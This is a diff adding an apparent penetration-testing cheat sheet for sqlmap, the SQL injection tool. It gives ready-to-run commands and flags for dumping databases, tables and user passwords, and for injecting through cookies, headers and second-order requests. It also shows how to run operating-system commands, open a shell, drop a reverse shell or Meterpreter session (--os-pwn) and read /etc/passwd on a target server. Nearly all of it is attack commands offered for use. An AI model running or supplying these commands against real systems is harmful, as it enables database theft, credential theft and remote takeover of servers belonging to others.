@@ -1,0 +1,67 @@
+#Dump Glabal Variables Table from information_schema DB
+sqlmap -r sqlfile --batch  -D information_schema -T GLOBAL_VARIABLES --tables --dump
+
+-u "<URL>"
+-p "<PARAM TO TEST>" 
+--user-agent=SQLMAP 
+--random-agent 
+--threads=10 
+--risk=3 #MAX
+--level=5 #MAX
+--dbms="<KNOWN DB TECH>" 
+--os="<OS>"
+--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
+--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
+--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
+--proxy=http://127.0.0.1:8080
+
+--current-user #Get current user
+--is-dba #Check if current user is Admin
+--hostname #Get hostname
+--users #Get usernames od DB
+--passwords #Get passwords of users in DB
+--privileges #Get privileges
+
+--all #Retrieve everything
+--dump #Dump DBMS database table entries
+--dbs #Names of the available databases
+--tables #Tables of a database ( -D <DB NAME> )
+--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
+-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
+
+#Inside cookie
+    sqlmap  -u "http://example.com" --cookie "mycookies=*"
+    #Inside some header
+    sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
+    sqlmap -u "http://example.com" --headers="referer:*"
+    #PUT Method
+    sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
+
+#Indicate string when injection is successful
+    --string="string_showed_when_TRUE" 
+
+#Exec command
+    python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami
+
+#Simple Shell
+    python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell
+
+#Dropping a reverse-shell / meterpreter
+    python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
+
+#Read File
+    --file-read=/etc/passwd
+
+#Second Order Injection
+    python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
+    sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
+
+#Set a suffix
+    python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
+
+#Prefix
+    python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
+
+#Tamper - In kali you can see all the tampers in /usr/share/sqlmap/tamper
+    --tamper=name_of_the_tamper
